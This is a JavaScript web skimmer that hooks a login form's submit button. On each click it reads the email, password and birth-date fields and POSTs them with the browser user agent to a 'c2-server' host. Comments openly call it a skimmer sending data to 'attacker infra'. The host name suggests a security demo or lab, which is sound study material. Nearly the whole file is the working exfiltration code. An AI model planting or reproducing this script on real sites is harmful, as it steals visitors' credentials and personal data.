window["data_leak_label_email"] = ["input[id*='wsi-login-credentials-form-email']", "input[name*='email']", "input[type*='email']"]
window["data_leak_label_password"] = ["input[id*='wsi-login-credentials-form-password']", "input[name*='password']"]
window["data_leak_label_birth_date"] = ["input[id*='wsi-login-credentials-form-birthdate']", "input[name*='birthDate']"]
window["data_leak_label_submit_button"] = ["button[id*='wsi-authenticate-button']"]

function send_data_to_c2_server(data) {
    var xhr = window["XMLHttpRequest"] ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
    xhr.open("POST", "https://c2-server.f5cloudbuilder.dev:5000/data-leak/");
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = function() {};
    xhr.send( JSON.stringify(data) );
    return xhr;
}

function hashCode(dict_input) {
    var data = [];
    var hash = 0, i, chr;

    // dict to string
    for (var key in dict_input){
        data.push(encodeURIComponent(key) +"="+ encodeURIComponent(dict_input[key]))
    }
    if (data.length == 0) return hash;
    data = data.join("&");

    // generate hash
    for (i = 0; i < data.length; i++) {
        chr   = data.charCodeAt(i);
        hash  = ((hash << 5) - hash) + chr;
        hash |= 0; // Convert to 32bit integer
    }
    return hash;
}

function get_element_selector(selector_list) {
    for (var i =0; i < selector_list.length; i++) {
      var element = document.querySelector(selector_list[i]);
      if (element) return element;
    }
    return false;
}

function get_elements_selector(selector_list) {
    var elements_all = [];
    for (var i = 0; i < selector_list.length; i++) {
        var elements = document.querySelectorAll(selector_list[i]);
        for (var j =0; j < elements.length; j++) {
            var element = elements[j];
            if (!(elements_all.includes(element))) {
                elements_all.push(element);
            }
        }
    }
    return elements_all;
}

function get_element_value(selectors) {
     var element = get_element_selector(selectors);
     if (!element) return false;
     return element.value;
}

function listener_fetch_data_leak() {
    // GET data to leak
    data_leak = {
        "email": get_element_value(window["data_leak_label_email"]),
        "password": get_element_value(window["data_leak_label_password"]),
        "birth_date": get_element_value(window["data_leak_label_birth_date"]),
        "uagent": navigator.userAgent
    }

    // Continue only if all elements exists
    for (var key in data_leak){
        if (!key) return;
    }

    // Prevent to do not send again previously sent data
    var data_leak_hash = hashCode(data_leak);
    console.log("hash:"); console.log(data_leak_hash);
    console.log("previous hash:"); console.log(window["skimmer_last_data"]);
    if (data_leak_hash == window["skimmer_last_data"]) return;
    window["skimmer_last_data"] = data_leak_hash;

    // Send data to attacker infra
    send_data_to_c2_server(data_leak);
}

function scan_page() {
    /**
    Look for elements
    If an element exists, CREATE "click" and "mousedown" listeners on this element
    **/

    // GET elements
    if (!(get_element_selector(window["data_leak_label_email"]))) return false;
    var selectors = window["data_leak_label_submit_button"];
    elements = get_elements_selector(selectors)

    // CREATE a listener for each element
    for (var i = 0; i < elements.length; i++) {
        var element = elements[i];

        if (!(element.getAttribute("skipper_flag") == "1")) {
            element.addEventListener("click", function() {
               try {
                    console.log("click >> run data leak");
                    listener_fetch_data_leak();
                    console.log("click >> data leaked");
               } catch (err) {}
            });
            element.addEventListener("mousedown", function() {
               try {
                    console.log("mousedown >> run data leak");
                    listener_fetch_data_leak();
                    console.log("mousedown >> data leaked");
            } catch (err) {}
            });
            element.setAttribute("skipper_flag", "1");
            console.log("listener added for element:"); console.log(element);
        }
    }
}

function scan_loop() {
    /**
    launch a scan on page every 5 seconds
    **/
    if (!(window["skimmer_loaded"])) {
        window["skimmer_loaded"] = true;
        scan_page();
        window["scan_interval"] = setInterval(function() {
            scan_page();
        }, 5000);
    }
}

/**
    CREATE a listener on "load" events.
    Once page finishes loading, launch a scan_loop
**/
document.addEventListener("DOMContentLoaded", function() { scan_loop(); }, false);
window.addEventListener("load", function() { scan_loop(); }, false);